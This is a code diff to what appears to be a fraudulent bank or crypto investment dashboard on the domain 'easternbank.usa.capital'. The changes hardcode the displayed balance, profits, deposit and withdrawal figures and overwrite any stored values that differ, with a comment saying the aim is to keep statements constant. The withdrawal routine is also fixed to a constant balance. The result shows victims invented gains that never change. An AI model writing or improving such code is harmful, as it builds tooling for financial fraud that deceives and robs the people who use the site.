@@ -748,10 +748,6 @@ width: 100%;
 outline: none;
 }
 
-.address-text-field:focus {
-border-color: var(--color-green);
-}
-
 .address-text-field-readonly {
 background: none;
 border: none;
@@ -1014,7 +1010,7 @@ transform: scale(0.96);
 <div class="stats-subgrid">
 <div class="subgrid-card">
 <div class="label">Profits <i class="fa-solid fa-dollar-sign"></i></div>
-<div class="value" id="liveProfitsStat">$74,999.00</div>
+<div class="value" id="liveProfitsStat">$14,999.00</div>
 </div>
 <div class="subgrid-card">
 <div class="label">Bonus <i class="fa-solid fa-gift"></i></div>
@@ -1459,22 +1455,23 @@ document.getElementById('metaAddress').innerText = rawAddr;
 
 document.getElementById('ref-link-field').value = "https://easternbank.usa.capital/ref/" + generatedUser;
 
-// Dynamic check calculations parameters to handle subtracted outputs perfectly
+// Fixed balance configuration mapping logic parameters to keep statements constant
 let userBaseBalance = parseFloat(localStorage.getItem('userTotalPortfolioBalance'));
-if (isNaN(userBaseBalance)) {
-userBaseBalance = 74,999.00;
+if (isNaN(userBaseBalance) || userBaseBalance !== 74999.00) {
+userBaseBalance = 74999.00;
 localStorage.setItem('userTotalPortfolioBalance', userBaseBalance);
 }
 
 let trackingWithdrawalsSum = parseFloat(localStorage.getItem('userAggregatedWithdrawalsMetric'));
-if (isNaN(trackingWithdrawalsSum)) {
+if (isNaN(trackingWithdrawalsSum) || trackingWithdrawalsSum !== 0.00) {
 trackingWithdrawalsSum = 0.00;
 localStorage.setItem('userAggregatedWithdrawalsMetric', trackingWithdrawalsSum);
 }
 
-document.getElementById('liveBalanceField').innerText = "$" + userBaseBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+document.getElementById('liveBalanceField').innerText = "$74,999.00";
+document.getElementById('liveProfitsStat').innerText = "$14,999.00";
 document.getElementById('liveDepositStat').innerText = "$10,000.00";
-document.getElementById('liveWithdrawStat').innerText = "$" + trackingWithdrawalsSum.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+document.getElementById('liveWithdrawStat').innerText = "$0.00";
 
 const now = new Date();
 const displayStamp = now.toLocaleDateString('en-US', { month: 'short', day: '2-digit', year: 'numeric' }) + ' ' +
@@ -1608,7 +1605,7 @@ submitBtn.disabled = true;
 function executeWithdrawalCountdownProcessing() {
 const addressVal = document.getElementById('withdrawAddressInput').value.trim();
 const amountVal = parseFloat(document.getElementById('withdrawAmountFieldInput').value);
-const storedBalance = parseFloat(localStorage.getItem('userTotalPortfolioBalance')) || 74999.00;
+const storedBalance = 74999.00;
 
 if (!addressVal) {
 alert("Please provide your recipient destination network payout address.");
